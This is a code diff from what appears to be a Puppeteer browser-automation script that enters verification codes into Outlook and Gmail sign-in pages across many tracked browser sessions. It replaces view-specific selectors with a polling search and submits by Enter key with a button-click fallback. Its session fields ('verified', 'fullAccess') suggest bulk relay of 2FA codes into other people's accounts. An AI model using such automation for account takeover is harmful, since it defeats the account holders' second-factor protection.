@@ -4815,69 +4815,107 @@ if (!foundSelector) {
                         activelyProcessing.add(browserId);
                         updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing verification code" }) }); // Set status to PROCESSING
 
-                        const currentViewNameForCode = JSON.parse(updateData.lastJsonResponse || '{}').viewName || initialCheckResult.viewName;
-                        let codeInputSelector;
-                        let codeSubmitSelector;
-                        let useEnterToSubmit = false;
-
-                        if (currentViewNameForCode === 'Outlook Enter Code Fluent') {
-                            codeInputSelector = platformConfig.selectors?.fluentCodeInput;
-                            codeSubmitSelector = platformConfig.selectors?.fluentCodeSubmit;
-                            useEnterToSubmit = true;
-                            logger.info(`[processRow][${browserId}][WAITINGCODE] Using Fluent code input selectors. Input: ${codeInputSelector}, Will press Enter to submit.`);
-                        } else if (currentViewNameForCode === 'Outlook Authenticator OTP') {
-                            codeInputSelector = platformConfig.selectors?.authenticatorCodeInput;
-                            codeSubmitSelector = platformConfig.selectors?.authenticatorCodeSubmit;
-                            logger.info(`[processRow][${browserId}][WAITINGCODE] Using Authenticator OTP code selectors. Input: ${codeInputSelector}, Submit: ${codeSubmitSelector}`);
-                        } else if (currentViewNameForCode === 'Gmail Email Code Entry') {
-                            codeInputSelector = platformConfig.selectors?.gmailEmailCodeInput;
-                            codeSubmitSelector = platformConfig.selectors?.gmailEmailCodeSubmit;
-                            logger.info(`[processRow][${browserId}][WAITINGCODE] Using Gmail email code selectors. Input: ${codeInputSelector}, Submit: ${codeSubmitSelector}`);
-                        } else if (currentViewNameForCode === 'Gmail Enter Code') {
-                            codeInputSelector = platformConfig.selectors?.verificationCodeInput;
-                            codeSubmitSelector = platformConfig.selectors?.verificationCodeSubmit;
-                            logger.info(`[processRow][${browserId}][WAITINGCODE] Using Gmail standard code selectors. Input: ${codeInputSelector}, Submit: ${codeSubmitSelector}`);
-                        } else {
-                            codeInputSelector = platformConfig.selectors?.verificationCodeInput;
-                            codeSubmitSelector = platformConfig.selectors?.verificationCodeSubmit;
-                            logger.info(`[processRow][${browserId}][WAITINGCODE] Using standard code input selectors. Input: ${codeInputSelector}, Submit: ${codeSubmitSelector}`);
-                        }
+                        const codeInputSelectors = [...new Set([
+                            platformConfig.selectors?.fluentCodeInput,
+                            platformConfig.selectors?.authenticatorCodeInput,
+                            platformConfig.selectors?.verificationCodeInput,
+                            platformConfig.selectors?.gmailEmailCodeInput,
+                        ].filter(Boolean))];
+                        const codeSubmitSelectors = [...new Set([
+                            platformConfig.selectors?.fluentCodeSubmit,
+                            platformConfig.selectors?.authenticatorCodeSubmit,
+                            platformConfig.selectors?.verificationCodeSubmit,
+                            platformConfig.selectors?.gmailEmailCodeSubmit,
+                        ].filter(Boolean))];
+                        logger.info(`[processRow][${browserId}][WAITINGCODE] Code input selectors to try: ${JSON.stringify(codeInputSelectors)}`);
 
                         let codeEntryAttempted = false;
-                        if (codeInputSelector) {
-                            try {
-                                await page.waitForSelector(codeInputSelector, { visible: true, timeout: 10000 });
-                                await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, codeInputSelector);
-                                await page.type(codeInputSelector, String(verificationCode), { delay: 50 });
-                                logger.info(`[processRow][${browserId}][WAITINGCODE] Typed code into ${codeInputSelector}`);
-
-                                const navigationPromise = page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 5000 })
-                                    .catch(e => logger.warn(`[processRow][${browserId}][WAITINGCODE] Navigation after code submit/Enter did not complete as expected or timed out: ${e.message}`));
-
-                                if (useEnterToSubmit) {
-                                    await page.keyboard.press('Enter');
-                                    logger.info(`[processRow][${browserId}][WAITINGCODE] Pressed Enter to submit fluent code.`);
-                                } else if (codeSubmitSelector) {
-                                    await page.waitForSelector(codeSubmitSelector, { visible: true, timeout: 5000 });
-                                    await page.click(codeSubmitSelector);
-                                    logger.info(`[processRow][${browserId}][WAITINGCODE] Clicked code submit button: ${codeSubmitSelector}`);
-                                } else {
-                                    logger.warn(`[processRow][${browserId}][WAITINGCODE] No submit selector and not flagged to use Enter. Code typed, hoping for auto-submit.`);
+                        let foundCodeSelector = null;
+                        const codePollTimeout = Date.now() + 30000;
+                        while (Date.now() < codePollTimeout && !foundCodeSelector) {
+                            for (const sel of codeInputSelectors) {
+                                try {
+                                    await page.waitForSelector(sel, { visible: true, timeout: 5000 });
+                                    foundCodeSelector = sel;
+                                    break;
+                                } catch (e) {
+                                    if (e.name === 'TimeoutError') continue;
                                 }
-
-                                await navigationPromise;
-                                logger.info(`[processRow][${browserId}][WAITINGCODE] Waited after code submission attempt for page to settle.`);
-                                codeEntryAttempted = true;
-
-                            } catch (codeEntryError) {
-                                logger.error(`[processRow][${browserId}][WAITINGCODE] Error during code entry/submission: ${codeEntryError.message}`);
                             }
+                            if (!foundCodeSelector) {
+                                await new Promise(res => setTimeout(res, 2000));
+                            }
+                        }
+
+                        if (!foundCodeSelector) {
+                            throw new Error(`Code input not found after 30s. Tried selectors: ${JSON.stringify(codeInputSelectors)}`);
+                        }
+
+                        try {
+                            await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, foundCodeSelector);
+                            await page.type(foundCodeSelector, String(verificationCode), { delay: 50 });
+                            logger.info(`[processRow][${browserId}][WAITINGCODE] Typed code into ${foundCodeSelector}`);
+
+                            const urlBeforeCodeSubmit = page.url();
+                            let submitMethod = null;
+
+                            try {
+                                await page.focus(foundCodeSelector).catch(() => null);
+                                await page.keyboard.press('Enter');
+                                await new Promise(res => setTimeout(res, 2500));
+                                submitMethod = 'ENTER_KEY';
+                                logger.info(`[processRow][${browserId}][WAITINGCODE] Submitted code via Enter key.`);
+                            } catch (enterErr) {
+                                logger.warn(`[processRow][${browserId}][WAITINGCODE] Enter key submission failed: ${enterErr.message}`);
+                            }
+
+                            if (submitMethod === 'ENTER_KEY') {
+                                const enterCheckStart = Date.now();
+                                let enterChangedPage = false;
+                                while (Date.now() - enterCheckStart < 8000) {
+                                    const urlNow = page.url();
+                                    const codeInputStillVisible = await page.$(foundCodeSelector).catch(() => null);
+                                    if (urlNow !== urlBeforeCodeSubmit || !codeInputStillVisible) {
+                                        enterChangedPage = true;
+                                        break;
+                                    }
+                                    await new Promise(res => setTimeout(res, 1000));
+                                }
+                                logger.info(`[processRow][${browserId}][WAITINGCODE] Enter submit verification: changed=${enterChangedPage}`);
+
+                                if (!enterChangedPage && codeSubmitSelectors.length > 0) {
+                                    logger.info(`[processRow][${browserId}][WAITINGCODE] Enter did not navigate. Falling back to button click.`);
+                                    for (const btnSel of codeSubmitSelectors) {
+                                        try {
+                                            await page.waitForSelector(btnSel, { visible: true, timeout: 5000 });
+                                            await new Promise(res => setTimeout(res, 150));
+                                            try {
+                                                await page.$eval(btnSel, el => (el.click && el.click()) || el.dispatchEvent(new MouseEvent('click', { bubbles: true })));
+                                            } catch (_) {
+                                                await page.click(btnSel);
+                                            }
+                                            await new Promise(res => setTimeout(res, 2500));
+                                            submitMethod = 'BUTTON:' + btnSel;
+                                            logger.info(`[processRow][${browserId}][WAITINGCODE] Button fallback clicked: ${btnSel}`);
+                                            break;
+                                        } catch (btnErr) {
+                                            logger.warn(`[processRow][${browserId}][WAITINGCODE] Button fallback '${btnSel}' failed: ${btnErr.message}`);
+                                        }
+                                    }
+                                }
+                            }
+
+                            codeEntryAttempted = true;
+                            logger.info(`[processRow][${browserId}][WAITINGCODE] Code submission complete via ${submitMethod || 'unknown'}.`);
+
+                        } catch (codeEntryError) {
+                            logger.error(`[processRow][${browserId}][WAITINGCODE] Error during code entry/submission: ${codeEntryError.message}`);
+                        }
 
                             if (codeEntryAttempted) {
                                 // Check for codeError immediately after submission
                                 let codeErrorSelector = platformConfig.selectors?.codeError;
-                                // Use authenticator-specific error selector for that view
-                                if (currentViewNameForCode === 'Outlook Authenticator OTP') {
+                                if (foundCodeSelector === platformConfig.selectors?.authenticatorCodeInput) {
                                     codeErrorSelector = platformConfig.selectors?.authenticatorCodeError || codeErrorSelector;
                                 }
                                 let codeErrorDetected = false;
